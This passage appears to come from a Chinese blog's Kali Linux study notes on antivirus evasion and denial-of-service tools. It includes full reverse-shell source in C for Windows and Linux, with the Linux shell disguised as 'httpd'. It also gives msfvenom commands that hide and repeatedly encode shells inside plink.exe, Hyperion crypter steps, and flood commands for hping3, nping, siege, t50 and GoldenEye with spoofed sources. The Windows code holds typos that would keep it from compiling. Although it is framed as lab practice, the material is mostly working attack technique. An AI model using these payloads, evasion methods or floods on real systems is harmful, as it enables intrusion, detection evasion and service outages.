<li>查看shell的免杀效果（查杀网站）</li>
</ul>
</li>
<li>Kali<ul>
<li>看是否能连接上shell</li>
<li><strong><code>🔺命令：shell</code></strong></li>
<li><strong><code>🔺命令：ipconfig</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>与veil-evasion集成</li>
<li>IAT——import address table<ul>
<li>指针指向WinAPI地址，被称为thunks（形实转换程序），地址预定义</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/kodex/bdf_p1.PNG" srcset="/img/loading.gif" alt="bdf_p1"></p>
<p><img src="/images/kali/kali-notepad/bdf_p2.PNG" srcset="/img/loading.gif" alt="bdf_p2"></p>
<p><img src="/images/kali/kali-notepad/bdf_p3.PNG" srcset="/img/loading.gif" alt="bdf_p3"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串</title>
    <url>/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E6%9F%A5%E6%9D%80%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<hr>
<h4 id="1-精确定位查杀字符串"><a href="#1-精确定位查杀字符串" class="headerlink" title="1. 精确定位查杀字符串"></a>1. 精确定位查杀字符串</h4><ul>
<li>传统防病毒查杀原理<ul>
<li>查找文件体中特殊字符串，匹配则查杀</li>
</ul>
</li>
<li>找到触发AV查杀的精确字符串，并将其修改<ul>
<li>找到执行程序分片成很多小片段</li>
<li>将包含MZ头的第一个片段与后续片段一次组合后交给AV查杀</li>
<li>重复以上步骤，最终精确定位</li>
<li>Evade（window程序）、hexeditor（十六进制编辑器）、ghex（图形化界面）<ul>
<li><strong><code>🔺命令：wine evade.exe</code></strong></li>
<li><strong><code>🔺命令：open a file → Select Output</code></strong></li>
<li><strong><code>🔺命令：hexeditor TestFile_10000.exe</code></strong></li>
</ul>
</li>
<li>▲ 2020.2.13无找到evade此工具</li>
</ul>
</li>
</ul>
<h4 id="2-shellter"><a href="#2-shellter" class="headerlink" title="2. shellter"></a>2. shellter</h4><ul>
<li>代码混淆</li>
<li>定制的编码方式</li>
<li>多态编码</li>
<li>集成部分msf payload</li>
<li>目前只支持32位PE程序</li>
<li>使用正常的exe文件作为模板，将payload代码加入模板内<ul>
<li>模板程序的功能将失效</li>
</ul>
</li>
<li>▲ 2020.2.13需分片工具分好的PE Target</li>
</ul>
<h4 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h4><ul>
<li>shellter<ul>
<li>Auto<ul>
<li>PE Target</li>
<li>L（列表）/C（定制）/H（帮助）</li>
</ul>
</li>
<li>Manaual</li>
<li>Help</li>
</ul>
</li>
<li>查看两个shell的免杀效果（查杀网站）</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九十一)：免杀技术--自编写shell</title>
    <url>/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E8%87%AA%E7%BC%96%E5%86%99shell/</url>
    <content><![CDATA[<hr>
<h4 id="1-自己编写后门"><a href="#1-自己编写后门" class="headerlink" title="1. 自己编写后门"></a>1. 自己编写后门</h4><ul>
<li>▲ 2020.2.13window的shell都无法通过编译</li>
<li>Windows reverse shell<ul>
<li><strong><code>🔺命令：wine gcc.exe windows_revers_shell.c -o windows.exe -lws2_32</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#include &lt;winsock2.h&gt;
#include &lt;stdio.h&gt;

#pragma comment(lib,&quot;ws2_32&quot;)

  WSADATA wsaData;
  SOCKET Winsock;
  SOCKET Sock;
  struct sockaddr_in hax;
  char ip_addr[16];
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;

int main(int argc,char *argv[])
{
    WSAStartup(MAKEWORD(2,2),&amp;wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    if(argc != 3)
    {
        fprintf(stderr,&quot;Uso:&lt;rhost&gt;&lt;rport&gt;\n&quot;);
        exit(1);
    }
    struct hostent *host;
    host = gethostbyname(argv[1]);
    strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(argv[2]));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock,(SOCKADDR*)&amp;hax,sizeof(hax),NULL,NULL,NULL,NULL);

    memset(&amp;ini_processo,0,sizeof(ini_preocesso));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)winsock;
    CreateProcess(NULL,&quot;cmd.exe&quot;,NULL,NULL,TRUE,0,NULL,NULL,&amp;ini_processo,&amp;processo_info);
}</code></pre><ul>
<li>Linux shell<ul>
<li><strong><code>🔺命令：gcc -o linux.sh linux_revers_shell.c</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;

int main(int argc,char *argv[])
{
    struct sockaddr_in sock;
    int s;
    if(argc != 3)
    {
        fprintf(stderr,&quot;uso:&lt;rhost&gt;&lt;rport&gt;\n&quot;);
        exit(1);
    }
    sock.sin_family = AF_INET;
    sock.sin_port = htons(atoi(argv[2]));
    sock.sin_addr.s_addr = inet_addr(argv[1]);
    s=socket(AF_INET,SOCK_STREAM,0);

    connect(s,(struct sockaddr_in *)&amp;sock,sizeof(struct sockaddr_in));

    dup2(s,0);
    dup2(s,1);
    dup2(s,2);
    execl(&quot;/bin/sh&quot;,&quot;httpd&quot;,(char *)0);  //process httpd
}</code></pre><p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=7bf2JUs5DMtehccBmf4Z5fv69w6jB6oxhpGZ55yIZcluckaHCJO9CdrybGQ8CTjNaH4B64ZYnAGNiQQ3eaRwhNhXMUnob2rCVCQ9AbGqPTFhF1JSP5uMXgA&file_name=/linux.sh.PNG" srcset="/img/loading.gif" alt="linux.sh"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九十)：免杀技术--模板程序附着</title>
    <url>/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E6%A8%A1%E6%9D%BF%E7%A8%8B%E5%BA%8F%E9%99%84%E7%9D%80/</url>
    <content><![CDATA[<hr>
<h4 id="1-msfvenom–隐藏shell"><a href="#1-msfvenom–隐藏shell" class="headerlink" title="1. msfvenom–隐藏shell"></a>1. msfvenom–隐藏shell</h4><ul>
<li>▲ 附着在正常的程序模板上</li>
<li>msfvenom参数<ul>
<li>-x（指定模板）</li>
</ul>
</li>
<li>生成隐藏shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o msfvenom_plink_a.exe</code></strong></li>
</ul>
</li>
<li>编码隐藏shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; msfvenom_plink_b.exe</code></strong></li>
</ul>
</li>
<li>比较编码前后的检测率</li>
<li>查看两个shell的免杀效果（查杀网站）</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=913dDsqoWqfgmCFaxKULa3Rs26q5N6faEj-afSVWXxmPFEyWfi0FyK0A_thO4SqsOfvw87Ge1Hny12CKH58veLiiG6xtX0el8dfZAsbAjsjpkjqvWWXxKG2Wz_sb64nD_Q&file_name=/msfvenom_plink_a.PNG" srcset="/img/loading.gif" alt="msfvenom_plink_a.exe"></p>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=7f190bA3M9ax_a8Q1iqGnAIpJSaoB7yLOES6ROWFjeyme_9ZqSszd37r_FPxawbOPK__maiCzUOBaOmPv2WB6NsnUWrDxn8z1nMSpSNY2mSMDrD8Xx3tAlUQRVTdu3pBbQ&file_name=/msfvenom_plink_b.PNG" srcset="/img/loading.gif" alt="msfvenom_plink_b.exe"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八十九)：免杀技术--crypter加密</title>
    <url>/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--crypter%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<hr>
<h4 id="1-msfvenom–加密shell"><a href="#1-msfvenom–加密shell" class="headerlink" title="1. msfvenom–加密shell"></a>1. msfvenom–加密shell</h4><ul>
<li>msfvenom参数<ul>
<li>-p（使用的payload）</li>
<li>-a（目标机器的架构）</li>
<li>–platform（目标机器的平台）</li>
<li>-f（生成的文件file）</li>
<li>-o（输出的文件）</li>
<li>-f（原文件格式，可通过管道）</li>
<li>-e（echo加密编码）</li>
<li>-i（加密的次数，跟-e一起使用）</li>
<li>-b（特殊字符的过来）</li>
</ul>
</li>
<li>strings → 查看文件中可读字符串  md5sum → 文件的md5值</li>
<li>生成反弹shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o msfvenom_crypt_a.exe</code></strong></li>
</ul>
</li>
<li>加密编码反弹shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o msfvenom_crypt_b.exe</code></strong></li>
</ul>
</li>
<li>比较编码前后的检测率</li>
<li>查看两个shell的免杀效果（查杀网站）</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=8f0a1L_0As6Rho8dCl4UUhyCmqiHqovU3g8Jhd-ON4QtEATGbXAQ5cKA0yi8ZA4fTsdKrGvGcnYyaI9cXNu2UMIxMvOodTNP2hKU4OV_pH8gqeQAZlVxuG6PMtyarIlC6w&file_name=/msfvenom_crypt_a.PNG" srcset="/img/loading.gif" alt="msfvenom_crypt_a.exe"></p>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=6cd2aOzy5MKuuA0pY73udUOCHBetewBeXijmZea0d-Se5oacdk_3Nm6KhwZUwEK2MJ2ZRAbm0DsXRKv9-njd6hQ0kpMNksZp6FyuHffV1_ciPbTiU2EkXqNf4fO4tNaJ1A&file_name=/msfvenom_crypt_b.PNG" srcset="/img/loading.gif" alt="msfvenom_crypt_b.exe"></p>
<h4 id="2-Hyperion–软件保护"><a href="#2-Hyperion–软件保护" class="headerlink" title="2. Hyperion–软件保护"></a>2. Hyperion–软件保护</h4><ul>
<li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li>
<li>常被恶意软件用于免杀目的</li>
<li>Hyperion（32bit PE程序加密器）<ul>
<li>window平台上的加密器</li>
<li>Crypter / Container（解密器+PE Loader）</li>
<li>默认路径：/usr/share/windows-binaries/</li>
<li><a href="https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip" target="_blank" rel="noopener">https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</a> </li>
<li><strong><code>🔺命令：unzip Hyperion-1.2.zip</code></strong> </li>
<li><strong><code>🔺命令：cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</code></strong> </li>
<li><strong><code>🔺命令：dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code></strong> </li>
<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o msfvenom_hyperion_a.exe</code></strong> </li>
<li><strong><code>🔺命令：wine h.exe msfvenom_hyperion_a.exe msfvenom_hyperion_b.exe</code></strong></li>
</ul>
</li>
<li>比较编码前后的检测率</li>
<li>查看两个shell类似的免杀效果（查杀网站）</li>
<li>▲ 2020.2.13Hyperion2.2版本在Linux上的编译无法完成</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=fd7fcm5altn_ywl6IaSFu-cEmdTZxX2GyJoYoFz5nMXEYMVEAEBqXfRVglRb_D2UTQ7bVQbRYhC5-akLtiF7J5q6AghORRd75nK8SwJU3ne1DYvqY_hdr_4l1b7MGqfXdMPCQw&file_name=/msfvenom_hyperion_a.PNG" srcset="/img/loading.gif" alt="msfvenom_hyperion_a.exe"></p>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=b04dEruGxgUTqqkEauX-ErRpeocbjwYTIOL7qOfv5xL8gVOYsy9n-4G1ofw_jPZqtsQFpKfNIcvJ_sHvMjjV-aCKTfRJzrc6yhboOqpA9UjNF31MNyhgpTD4yCA-JZ3xXvV-JQ&file_name=/msfvenom_hyperion_b.PNG" srcset="/img/loading.gif" alt="msfvenom_hyperion_b.exe"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八十八)：恶意软件、防病毒软件、当前现状</title>
    <url>/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AB)%EF%BC%9A%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81%E9%98%B2%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E3%80%81%E5%BD%93%E5%89%8D%E7%8E%B0%E7%8A%B6/</url>
    <content><![CDATA[<hr>
<h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1. 恶意软件"></a>1. 恶意软件</h4><ul>
<li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li>
<li>在用户非自愿的情况下执行安装</li>
<li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li>
</ul>
<h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2. 防病毒软件"></a>2. 防病毒软件</h4><ul>
<li>恶意程序最主要的防护手段<ul>
<li>杀毒软件/防病毒软件</li>
<li>客户端/服务器/邮件防病毒（OS上，查看邮件流/防火墙后，对邮件流进行查杀）</li>
</ul>
</li>
<li>检测原理<ul>
<li>基于二进制文件中特征签名的黑名单检测方法（病毒特征库）</li>
<li>基于行为的分析方法（启发式）</li>
</ul>
</li>
<li>事后手段<ul>
<li>永远落后于病毒发展</li>
</ul>
</li>
</ul>
<h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3. 免杀技术"></a>3. 免杀技术</h4><ul>
<li>修改二进制文件中的特征字符<ul>
<li>替换、擦除、修改</li>
</ul>
</li>
<li>加密技术（crypter）<ul>
<li>通过加密使得特征字符不可读，从而逃避AV检测</li>
<li>运行时分片分段的解密执行，注入进程或AV不检查的无害文件中</li>
</ul>
</li>
<li>防病毒软件的检测<ul>
<li>恶意程序本身的特征字符</li>
<li>加密器crypter的特征字符</li>
</ul>
</li>
</ul>
<h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4. 当前现状"></a>4. 当前现状</h4><ul>
<li>恶意软件制造者<ul>
<li>编写私有RAT软件，避免普遍被AV所知的特征字符</li>
<li>使用独有crypter软件加密恶意程序</li>
<li>处事低调，尽量避免被发现</li>
<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
<li>Fully UnDetectable是最高追求（FUD）</li>
</ul>
</li>
<li>AV厂商<ul>
<li>广泛采集样本，尽快发现新出现的恶意程序，更新病毒库</li>
<li>一般新的恶意软件安全UD窗口期是一周左右</li>
<li>与恶意软件制造者永无休止的拉锯战</li>
<li>新的启发式检测技术尚有待完善（误杀露杀）</li>
</ul>
</li>
<li>单一AV厂商的病毒库很难达到100%覆盖<ul>
<li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul>
<li>接口被某些国家的AV软件免费利用，没有自己的病毒库</li>
</ul>
</li>
<li><a href="http://www.viruscan.org/" target="_blank" rel="noopener">http://www.viruscan.org/</a> ▲ 2020.2.13此网站不可用</li>
<li>在线多引擎查杀网站与AV厂商共享信息</li>
<li>搞黑的在线多引擎查毒站<ul>
<li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li>
<li><a href="http://viruscheckmate.com/check" target="_blank" rel="noopener">http://viruscheckmate.com/check</a> ▲ 2020.2.13此网站不可用</li>
</ul>
</li>
</ul>
</li>
<li>常用RAT软件<ul>
<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
<li>▲ 下载测试几款RAT软件</li>
<li>▲ 2020.2.13已下载到灰鸽子、NanoCore</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八十七)：DoS工具包</title>
    <url>/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E5%B7%A5%E5%85%B7%E5%8C%85/</url>
    <content><![CDATA[<hr>
<h4 id="1-拒绝服务攻击工具"><a href="#1-拒绝服务攻击工具" class="headerlink" title="1. 拒绝服务攻击工具"></a>1. 拒绝服务攻击工具</h4><ul>
<li>RUDY<ul>
<li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li>
<li>▲ 与slowhttptest的区别：每次只传输一个字节的数据</li>
<li>▲ 攻击有表单WEB页面，攻击时需指定攻击的参数名称</li>
<li>美剧”黑客军团”中曾提到此攻击手段</li>
<li><a href="http://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">http://sourceforge.net/projects/r-u-dead-yet/</a></li>
</ul>
</li>
<li>Hping3<ul>
<li>几乎可以定制发送任何TCP/IP数据包，用于测试FW、端口扫描、性能测试</li>
<li>参数<ul>
<li>-c（建立的连接数）</li>
<li>-d（发送的数据包要有多大）</li>
<li>-S（Syn Flood攻击）</li>
<li>-w（window大小，默认为64字节）</li>
<li>-p（目标端口）</li>
<li>–rand-source（随机产生源地址）</li>
<li>-P/-U（TCP标记位PSH/URG）</li>
<li>-q（不显示攻击结果）</li>
<li>-a（伪造源地址）</li>
<li>-n（不解析域名）</li>
<li>-s（指定源端口）</li>
</ul>
</li>
<li>Syn Flood攻击<ul>
<li><strong><code>🔺命令：hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood</code></strong> –rand-source 1.1.1.1</li>
<li><strong><code>🔺命令：hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1</code></strong></li>
</ul>
</li>
<li>TCP Flood攻击     <ul>
<li><strong><code>🔺命令：hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1</code></strong></li>
</ul>
</li>
<li>ICMP Flood攻击<ul>
<li><strong><code>🔺命令：hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.2</code></strong></li>
</ul>
</li>
<li>UDP Flood攻击<ul>
<li><strong><code>🔺命令：hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2</code></strong></li>
</ul>
</li>
<li>LAND攻击<ul>
<li>特殊种类的SYN FLood攻击</li>
<li>源地址、目的地址都是受害者，受害者于自己完成三次握手</li>
<li><strong><code>🔺命令：hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>nping<ul>
<li>TCP全链接DoS攻击<ul>
<li><strong><code>🔺命令：nping --tcp-connect --rate=10000 -c 1000000000 -q 1.1.1.1</code></strong></li>
</ul>
</li>
<li>查公网IP<ul>
<li><strong><code>🔺命令：nping --echo-client &quot;public&quot; echo.nmap.org --udp</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Siege<ul>
<li>http/https压力测试工具，模拟多个用户并发访问请求</li>
<li><strong><code>🔺命令：siege -g http://1.1.1.1/a.php / 1.1.1.1</code></strong> </li>
<li><strong><code>🔺命令：siege -i -c 1000</code></strong></li>
<li><strong><code>🔺命令：siege -i -c 1000 http://1.1.1.1/a.php -A siegehttp</code></strong></li>
<li>同时攻击多个url，使用-f调用字典文件<ul>
<li>/etc/siege/urls.txt </li>
</ul>
</li>
</ul>
</li>
<li>T50网络压力测试<ul>
<li>▲ t50 -h（t50命令详细）</li>
<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S --protocol TCP --dport 80</code></strong> </li>
<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22</code></strong></li>
</ul>
</li>
<li>Nmap<ul>
<li><strong><code>🔺命令：grep dos /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot;&quot; -f 2</code></strong></li>
<li><strong><code>🔺命令：cat /usr/share/nmap/scripts/script.db</code></strong></li>
</ul>
</li>
</ul>
<h4 id="2-匿名者拒绝服务工具包"><a href="#2-匿名者拒绝服务工具包" class="headerlink" title="2. 匿名者拒绝服务工具包"></a>2. 匿名者拒绝服务工具包</h4><ul>
<li>匿名者发布的DoS工具<ul>
<li>LOIC</li>
<li>HOIC</li>
<li>DDoSer</li>
</ul>
</li>
<li>招募志愿者发放以上工具</li>
<li>以上DoS工具不隐藏真实IP地址</li>
<li>▲ 选取消耗系统资源更大的页面</li>
</ul>
<h4 id="3-其他拒绝服务工具"><a href="#3-其他拒绝服务工具" class="headerlink" title="3. 其他拒绝服务工具"></a>3. 其他拒绝服务工具</h4><ul>
<li>XOIC<ul>
<li>攻击任意IP地址的指定端口</li>
<li><strong><code>🔺命令：git clone git://git.code.sf.net/p/xoic/code xoic-code</code></strong> </li>
<li><a href="https://xoicdoser.wordpress.com/" target="_blank" rel="noopener">https://xoicdoser.wordpress.com/</a></li>
<li>三种模式：test、normal、DoS Attack</li>
<li>支持协议：TCP/HTTP/UDP/ICMP</li>
<li>▲ 数据包难以找到/软件包带有恶意软件</li>
</ul>
</li>
<li>HULK–Http Unbearable Load King<ul>
<li>Python脚本</li>
<li>随机产生大量唯一的地址请求，避免缓存命中（▲ 对企业有nginx等反向代理软件）</li>
<li>耗尽WEB服务器资源池</li>
<li><a href="https://packetstormsecurity.com/files/download/112856/hulk.zip" target="_blank" rel="noopener">https://packetstormsecurity.com/files/download/112856/hulk.zip</a></li>
</ul>
</li>
<li>DDoSIM<ul>
<li>7层拒绝服务工具（模拟多个僵尸机）</li>
<li>随机IP地址</li>
<li>基于TCP连接的攻击</li>
<li>应用层DDoS攻击</li>
<li>正常的HTTP请求、非正常的HTTP请求式DDoS</li>
<li>SMTP DDoS</li>
<li>随机端口的TCP连接洪水</li>
<li>▲ 数据包难以找到/软件包带有恶意软件</li>
<li>▲ 2020.2.13 找到此工具后无法编译</li>
</ul>
</li>
<li>GoldenEye<ul>
<li>http/https拒绝服务攻击工具</li>
<li>安全研究位目的的Python脚本</li>
<li>随机攻击向量，keep-alive，避免缓存命中</li>
<li><strong><code>🔺命令：wget https://github.com/jseidl/GoldenEye/archive/master.zip</code></strong> </li>
<li><strong><code>🔺命令：unzip master.zip</code></strong> </li>
<li><strong><code>🔺命令：./goldeneye.py -h</code></strong>（▲ 查看goldeneye选项）</li>
<li><strong><code>🔺命令：./goldeneye.py http://1.1.1.1 -w 50</code></strong></li>
<li>▲ -w（僵尸机）</li>
<li>▲ 2020.2.13 此工具运行后抓包无发生数据</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/XOIC.PNG" srcset="/img/loading.gif" alt="XOIC"></p>
<h4 id="4-实验–RUDY"><a href="#4-实验–RUDY" class="headerlink" title="4. 实验–RUDY"></a>4. 实验–RUDY</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>物理机上拷贝下载的RUDY文件，进行解压查看，可以修改配置文件rudeadyet.conf</li>
<li>浏览器访问Metasploit尝试连接，找出表单对应的变量名称</li>
<li>修改配置文件rudeadyet.conf（URL、attack_parameters）</li>
<li><strong><code>🔺命令：./r-u-dead-yet-v2.2.py</code></strong></li>
<li>可通过Wireshark抓包，查看发送的数据包（TCP segement byte是否为一个字节）</li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/rudy%E6%94%BB%E5%87%BB.PNG" srcset="/img/loading.gif" alt="rudy攻击"></p>
<h4 id="5-实验–hping3"><a href="#5-实验–hping3" class="headerlink" title="5. 实验–hping3"></a>5. 实验–hping3</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li><strong><code>🔺命令：hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：hping3 -S -P -U -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：hping3 -SARFUP -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：hping3 -a Metasploit的IP -S -d 100 -p 80 --flood Metasploit的IP</code></strong></li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<h4 id="6-实验–nping"><a href="#6-实验–nping" class="headerlink" title="6. 实验–nping"></a>6. 实验–nping</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li><strong><code>🔺命令：nping --tcp-connect --rate=10000 -c 1000000000 -q Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：nping --echo-client &quot;public&quot; echo.nmap.org --udp</code></strong></li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<h4 id="7-实验–siege"><a href="#7-实验–siege" class="headerlink" title="7. 实验–siege"></a>7. 实验–siege</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li><strong><code>🔺命令：siege -g http://Metasploit的IP/a.php / Metasploit的IP</code></strong>（查看banner信息）</li>
<li><strong><code>🔺命令：siege -i（互联网形式） -c 1000 http://Metasploit的IP/a.php -A（user-agent） siegehttp</code></strong></li>
<li><strong><code>🔺命令：siege -i -c 1000</code></strong>（去默认文件夹寻找URL地址）</li>
<li>可通过Wireshark抓包，查看发送的数据包</li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<h4 id="8-实验–t50"><a href="#8-实验–t50" class="headerlink" title="8. 实验–t50"></a>8. 实验–t50</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig查看IP地址</code></strong></li>
<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
</ul>
</li>
<li>Kali<ul>
